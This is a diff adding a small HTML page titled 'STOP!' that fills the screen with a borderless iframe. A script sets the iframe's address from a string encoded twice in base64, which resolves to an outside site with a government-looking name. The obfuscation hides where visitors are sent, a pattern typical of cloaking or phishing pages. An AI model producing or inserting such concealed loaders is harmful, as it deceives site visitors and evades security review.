@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STOP!</title>
+</head>
+<body>
+    <iframe id="decodedFrame" 
+            width="100%" 
+            height="100%" 
+            frameborder="0" 
+            marginwidth="0" 
+            marginheight="1" 
+            allowfullscreen="true">
+    </iframe>
+
+    <script>
+        const encodedURL = "ZGF0YTovcGxhaW47YmFzZTY0LGFIUjBjSE02THk5bmIzWXVhMnBsTG5Weg==";
+        const decodedURL = atob(encodedURL);
+        const finalURL = atob(decodedURL.split(',')[1]);
+        document.getElementById('decodedFrame').src = finalURL;
+    </script>
+</body>
+</html>
